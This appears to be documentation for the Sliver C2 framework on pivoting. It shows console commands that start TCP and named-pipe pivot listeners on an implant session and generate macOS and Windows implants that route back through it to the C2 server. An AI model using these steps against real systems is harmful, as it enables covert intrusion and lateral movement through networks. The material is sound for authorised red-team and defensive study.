Pivots allow routing implant traffic through other implants. This can be useful in environments that don’t have any outbound access, but are reachable from other parts of the network that you have access to.

Sliver supports two types of pivots: TCP, which can be used on all operating systems, and named pipes, which are Windows-only.

In both cases the workflow is relatively similar, as a first step, select a session and set up a pivot listener.

```bash
[server] sliver (INNER_GO-KART) > pivots tcp

[*] Started tcp pivot listener :9898 with id 1

[server] sliver (INNER_GO-KART) > pivots

 ID   Protocol   Bind Address   Number Of Pivots
==== ========== ============== ==================
  1   TCP        :9898                         0
```

The listening port and interface can be configured during creation.

The next step is to generate a payload that will connect to our listener.

```bash
[server] sliver (INNER_GO-KART) > generate --tcp-pivot 127.0.0.1 --os macos

[*] Generating new darwin/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 12s
[*] Implant saved to /Users/tester/tools/VALUABLE_SICK
```

Executing this payload will cause it to connect back through our original implant and then back to our C2 server.

```asciinema
{"src": "/asciinema/tcppivot.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

As mentionned before named pipe pivots use a similar process, first you need to create a listener:

```bash
[server] sliver (WARM_DRIVEWAY) > pivots named-pipe --bind foobar

[*] Started named pipe pivot listener \\.\pipe\foobar with id 1

```

You can then generate an implant connecting to it 

```bash
sliver > generate --os windows --debug --skip-symbols --named-pipe ./pipe/foobar

[*] Generating new windows/amd64 implant binary
[*] Build completed in 1s
[*] Implant saved to /Users/tester/code/sliver/PROPER_SING.exe
```

